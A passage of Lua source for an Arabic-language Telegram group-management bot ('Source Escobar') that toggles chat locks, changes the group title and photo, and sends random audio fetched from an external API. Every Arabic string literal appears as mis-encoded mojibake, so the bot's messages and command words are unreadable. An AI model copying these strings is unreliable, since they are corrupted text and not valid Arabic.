Dev_mfm(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Escobar     --
if text == "ΨΊΩΩΩΩ" and ChCheck(msg) then
data,res = https.request('https://apiabs.ml/Audios.php')
if res == 200 then
Audios = json:decode(data)
if Audios.Info == true then
local Text ='*β β« ΨͺΩΩΩΩ Ψ§Ψ?ΨͺΩΨ§Ψ± Ψ§ΩΩΩΨ·ΨΉ Ψ§ΩΨ΅ΩΨͺΩ ΩΩ*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'β Escobar Team .',url="t.me/TEAM_Escobar"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
--     Source Escobar     --
if Admin(msg) then
if Devmfm:get(mustafa..'mfm:LockSettings'..msg.chat_id_) then 
if text == "Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·" then if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then mute_links = 'ΩΩΩΩΩ' else mute_links = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· β "..mute_links.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΨΉΨ±Ω" or text == "Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ" then if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then lock_tag = 'ΩΩΩΩΩΩ' else lock_tag = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΨΉΨ±Ω β "..lock_tag.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΨͺΨ­Ψ±ΩΩ" or text == "Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'ΩΩΩΩΩΩ' else mute_gifs = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΨͺΨ­Ψ±ΩΩ β "..mute_gifs.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ" then if Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'ΩΩΩΩΩΩ' else lock_sticker = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ β "..lock_sticker.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ΅ΩΨ±" then if Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then mute_photo = 'ΩΩΩΩΩΩ' else mute_photo = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ΅ΩΨ± β "..mute_photo.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΩΩΩ°Ψ―ΩΩ" or text == "Ψ§ΩΩΩΩΩ°Ψ―ΩΩΩΨ§Ψͺ" then if Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then mute_video = 'ΩΩΩΩΩΩ' else mute_video = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΩΩΩ°Ψ―ΩΩ β "..mute_video.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ§ΩΩΩΨ§ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then mute_in = 'ΩΩΩΩ' else mute_in = 'ΩΩΨͺΩΨ­' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ§ΩΩΩΨ§ΩΩ β "..mute_in.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω" then if Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then mute_text = 'ΩΩΩΩΩ' else mute_text = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω β "..mute_text.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨͺΩΨ¬ΩΩ" or text == "Ψ§ΨΉΨ§Ψ―Ω Ψ§ΩΨͺΩΨ¬ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then lock_forward = 'ΩΩΩΩ' else lock_forward = 'ΩΩΨͺΩΨ­' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨͺΩΨ¬ΩΩ β "..lock_forward.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ§ΨΊΨ§ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then mute_music = 'ΩΩΩΩΩΩ' else mute_music = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ§ΨΊΨ§ΩΩ β "..mute_music.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ΅ΩΨͺ" or text == "Ψ§ΩΨ΅ΩΨͺΩΨ§Ψͺ" then if Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then mute_voice = 'ΩΩΩΩΩ' else mute_voice = 'ΩΩΨͺΩΨ­' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ΅ΩΨͺ β "..mute_voice.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ¬ΩΨ§Ψͺ" or text == "Ψ¬ΩΨ§Ψͺ Ψ§ΩΨ§ΨͺΨ΅Ψ§Ω" then if Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then lock_contact = 'ΩΩΩΩΩΩ' else lock_contact = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ¬ΩΨ§Ψͺ β "..lock_contact.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then markdown = 'ΩΩΩΩ' else markdown = 'ΩΩΨͺΩΨ­' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ β "..markdown.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω" then if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'ΩΩΩΩ' else lock_htag = 'ΩΩΨͺΩΨ­' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΨ§Ψ΄ΨͺΨ§Ω β "..lock_htag.."\n"Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨͺΨΉΨ―ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'ΩΩΩΩ' else mute_edit = 'ΩΩΨͺΩΨ­' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨͺΨΉΨ―ΩΩ β "..mute_edit.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" then if Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then lock_pin = 'ΩΩΩΩ' else lock_pin = 'ΩΩΨͺΩΨ­' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ β "..lock_pin.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ" then if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'ΩΩΩΩΩΩ' else lock_tgservice = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ β "..lock_tgservice.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΩΨ§ΩΨ΄" then if Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) then lock_spam = 'ΩΩΩΩΩΩ' else lock_spam = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΩΨ§ΩΨ΄ β "..lock_spam.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ―Ψ?ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:Join'..msg.chat_id_) then lock_Join = 'ΩΩΩΩΩ' else lock_Join = 'ΩΩΨͺΩΨ­' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ―Ψ?ΩΩ β "..lock_Join.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ" then if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'ΩΩΩΩΩΩ' else lock_wp = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ΄Ψ¨ΩΨ§Ψͺ β "..lock_wp.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΩΨ§ΩΨΉ" then if Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then lock_location = 'ΩΩΩΩΩΩ' else lock_location = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΩΨ§ΩΨΉ β "..lock_location.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨΉΨ±Ψ¨ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'ΩΩΩΩΩΩ' else lock_arabic = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨΉΨ±Ψ¨ΩΩ β "..lock_arabic.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ" then if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then lock_english = 'ΩΩΩΩΩΩ' else lock_english = 'ΩΩΨͺΩΨ­Ω' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ§ΩΩΩΩΨ²ΩΩ β "..lock_english.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΩΨ±" then if Devmfm:get(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'ΩΩΨͺΩΨ­' else lock_kaf = 'ΩΩΩΩ' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΩΨ± β "..lock_kaf.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΩΨ΄Ψ§Ψ±" then if Devmfm:get(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'ΩΩΨͺΩΨ­' else lock_fshar = 'ΩΩΩΩ' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΩΨ΄Ψ§Ψ± β "..lock_fshar.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
if text == "Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω" then if Devmfm:get(mustafa..'mfm:Lock:Taf'..msg.chat_id_) then lock_taf = 'ΩΩΨͺΩΨ­Ω' else lock_taf = 'ΩΩΩΩΩ' end local mustafaTEAM = "\n" .."β β« Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω β "..lock_taf.."\n" Dev_mfm(msg.chat_id_, msg.id_, 1, mustafaTEAM, 1, 'md') end
end
--     Source Escobar     --
if text == 'ΨͺΩΨΉΩΩ ΩΨ΄Ω Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ' and ChCheck(msg) then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ ΩΨ΄Ω Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:LockSettings'..msg.chat_id_,true)  
end
if text == 'ΨͺΨΉΨ·ΩΩ ΩΨ΄Ω Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ' and ChCheck(msg) then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ ΩΨ΄Ω Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:LockSettings'..msg.chat_id_) 
end
--     Source Escobar     --
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Stupid'..msg.chat_id_)
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Stupid'..msg.chat_id_,true)
end
--     Source Escobar     --
if text and (text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ­ΩΩ' or text == 'ΩΩΩ Ψ§ΩΨͺΨ­ΩΩ' or text == 'ΨͺΨΉΨ·ΩΩ ΨͺΩΨ¨ΩΩ Ψ§ΩΨ―Ψ?ΩΩ') and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'βοΈΨ§ΩΩΨ§ ΨΉΨ²ΩΨ²Ω β '..mfmRank(msg)..' \nβοΈΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ­ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Robot'..msg.chat_id_)
end
if text and (text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ­ΩΩ' or text == 'ΩΨͺΨ­ Ψ§ΩΨͺΨ­ΩΩ' or text == 'ΨͺΩΨΉΩΩ ΨͺΩΨ¨ΩΩ Ψ§ΩΨ―Ψ?ΩΩ') and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'βοΈΨ§ΩΩΨ§ ΨΉΨ²ΩΨ²Ω β '..mfmRank(msg)..' \nβοΈΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ­ΩΩ Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Robot'..msg.chat_id_,true)
end
--     Source Escobar     --
if text == 'ΨͺΩΨΉΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:GpRed'..msg.chat_id_)
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:GpRed'..msg.chat_id_,true)
end
--     Source Escobar     --
if text == 'ΨͺΩΨΉΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:AllRed'..msg.chat_id_)
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±' and Manager(msg) and ChCheck(msg) then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:AllRed'..msg.chat_id_,true)
end
--     Source Escobar     --
if SecondSudo(msg) then
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω' or text == 'β ΨͺΩΨΉΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω β' then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa.."mfm:Left:Bot"..mustafa)
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω' or text == 'β ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω β' then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa.."mfm:Left:Bot"..mustafa,true) 
end 
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ' or text == 'β ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ β' then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa.."mfm:Send:Bot"..mustafa)
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ' or text == 'β ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ β' then 
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ¨ΩΨ¬Ψ§Ψ­'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa.."mfm:Send:Bot"..mustafa,true) 
end
end
--     Source Escobar     --
if text and text:match("^ΨΆΨΉ Ψ§Ψ³Ω (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ΨΆΨΉ Ψ§Ψ³Ω) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"β β« Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© ΨͺΨΊΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ")  
else
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
--     Source Escobar     --
if msg.content_.photo_ then
if Devmfm:get(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ ΩΨ§ΩΩΨ­Ψ§ΩΩΩ ΩΨ§Ψ­ΩΨ§") 
Devmfm:del(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"β β« ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© ΨͺΨΊΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ") 
Devmfm:del(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± Ψ΅ΩΨ±Ψ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
Devmfm:del(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ΨΆΨΉ Ψ΅ΩΨ±Ω$") and ChCheck(msg) or text and text:match("^ΩΨΆΨΉ Ψ΅ΩΨ±Ω$") and ChCheck(msg) then
Dev_mfm(msg.chat_id_,msg.id_, 1, 'β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω Ψ΅ΩΨ±Ψ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© Ψ§ΩΨ§Ω', 1, 'md')
Devmfm:set(mustafa..'mfm:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source Escobar     --
if text and text:match("^Ψ­Ψ°Ω Ψ§ΩΨ΅ΩΨ±Ω$") and ChCheck(msg) or text and text:match("^ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ±Ω$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ΅ΩΨ±Ψ© Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©")  
return false  
end
--     Source Escobar     --
if Manager(msg) then
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ$") and ChCheck(msg) or text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ$") and ChCheck(msg) then
if Devmfm:sismember(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
